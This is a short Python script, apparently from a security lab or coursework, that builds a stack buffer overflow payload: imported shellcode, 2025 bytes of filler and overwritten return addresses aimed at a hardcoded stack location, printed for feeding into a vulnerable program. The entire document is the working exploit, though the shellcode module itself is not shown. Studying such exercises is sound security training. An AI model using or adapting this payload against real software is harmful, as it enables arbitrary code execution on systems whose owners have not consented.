from struct import pack
from shellcode import shellcode

return_addr = pack("<I", 0xbffeb8b8 + 0x4)
new_return_addr = pack("<I", 0xbffeb8b8 - 0x810)
garbage = "\x69" * (2025)

print(shellcode + garbage + new_return_addr + return_addr)
